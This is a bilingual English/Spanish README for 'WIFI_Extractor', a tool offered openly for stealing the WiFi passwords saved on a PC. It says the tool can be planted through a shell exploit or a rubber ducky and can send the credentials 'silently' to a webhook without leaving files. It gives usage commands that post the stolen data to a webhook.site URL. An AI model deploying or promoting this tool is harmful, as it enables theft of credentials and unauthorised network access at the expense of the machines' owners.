# WIFI_Extractor

if you run it with python you might need this requeriments
Tal vez podrias necesitar estos requerimientos


pip install click

pip install elementpath

pip install requests

Script to extract WIFI passwords from a pc uploading it remotely (shell exploit) and send it to a url "silently"(webhook without leaving files 
and also can be used offline, physically (rubber ducky)

Script para extraer contraseñas WIFI de un pc subiendolo remotamente(shell exploit) y enviarlo a una url "silenciosamente"(webhook) 
Tambien se puede usar offline, físicamente con un pendrive(rubby ducky)

Usage: E_WIFI.py [OPTIONS]


Options:

  -u, --url TEXT      Webhook/POST URL
  
  -o, --only-webhook  Only send data to webhook (whithout creating the txt file) need to specify the url with -u Envía los datos
                      solo a la webhook (sin crear el archivo txt) necesitas especificar la url con -u
                      
  -v, --version       Imprime la version | Prints the version
  
  --help              Show this message and exit.
  

Offline

python3 E_WIFIoffline.py

CMD or Powershell ./E_WIFIoffline.exe (You can also double click it)

Creates a txt with the WIFI's ssid and passwords stored in the local machine
Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local

Online

Usages

default usage
python3 E_WIFI.py

CMD or Powershell ./E_WIFI.exe

Creates a txt with the WIFI's ssid and passwords stored in the local machine
Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local

Another Example

python3 E_WIFI.py -o -u https://webhook.site/yoururl 
CMD or Powershell ./E_WIFI.exe -o -u https://webhook.site/yoururl

type --help for more detailed info

PD: Extracciones.txt is the txt with the wifis credentials
